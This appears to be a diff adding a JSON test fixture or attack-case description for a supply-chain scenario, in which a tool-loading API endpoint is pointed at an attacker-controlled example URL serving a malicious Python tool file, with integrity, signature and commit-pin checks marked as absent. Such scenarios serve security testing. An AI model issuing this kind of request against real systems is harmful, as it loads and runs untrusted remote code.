@@ -1,0 +1,14 @@
+{
+  "target": "POST /api/v1/tools/load/url",
+  "url": "https://attacker-controlled.example/openwebui-tool.py",
+  "source": {
+    "type": "python",
+    "expected_integrity_verification": false,
+    "expected_signature_verification": false,
+    "expected_commit_pin": false
+  },
+  "attack": {
+    "replace_legitimate_tool_source": true,
+    "malicious_source": "tool.py"
+  }
+}
